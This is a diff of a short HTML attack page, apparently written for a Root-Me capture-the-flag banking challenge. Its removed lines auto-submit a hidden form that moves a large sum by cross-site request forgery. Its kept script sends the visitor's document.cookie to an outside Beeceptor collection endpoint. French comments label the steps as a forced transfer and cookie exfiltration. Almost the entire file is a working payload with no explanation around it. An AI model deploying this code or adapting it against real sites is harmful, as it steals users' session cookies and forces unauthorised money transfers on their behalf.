@@ -1,22 +1,10 @@
 <!DOCTYPE html>
 <html>
-  <body onload="document.forms[0].submit();">
-    <!-- 1. Effectuer un transfert d'argent par CSRF -->
-    <form action="https://bankme-0.challenges.pro.root-me.org/profile" method="POST">
-      <input type="hidden" name="recipient" value="comptedetest">
-      <input type="hidden" name="amount" value="1000000000">
-    </form>
-
-    <!-- 2. Exfiltrer le cookie vers ton Beeceptor -->
+  <body>
     <script>
       fetch("https://monprojetest.free.beeceptor.com/cookie", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          cookie: document.cookie
-        })
+        body: document.cookie
       });
     </script>
   </body>
